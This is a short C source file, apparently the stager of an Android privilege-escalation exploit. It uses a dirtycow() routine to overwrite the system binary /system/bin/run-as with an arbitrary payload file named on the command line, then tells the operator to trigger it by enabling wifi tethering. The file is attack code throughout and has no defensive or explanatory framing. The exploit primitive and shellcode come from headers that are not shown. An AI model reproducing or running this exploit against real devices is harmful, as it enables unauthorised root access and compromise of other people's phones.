#include <stdio.h>
#include <unistd.h>

#include "shellcode.h"
#include "shared.h"

/**
 * stages a file in the /system/bin/run-as binary.
 */
int main(int argc, const char *argv[]) {

	const char *filename;

	if( argc != 2 ) {
		printf("usage: %s <payload>\n", argv[0]);
		return 1;
	}

	filename = argv[1];
	
	printf("[+] stager loading %s\n", filename);
	if(dirtycow("/system/bin/run-as", filename)) {
		LOGV("ERROR: could not dirtycow run-as with %s\n", filename);
		return 1;
	}

	printf("[+] stager loaded %s. trigger by enabling wifi tethering\n", filename);

	return 0;
}
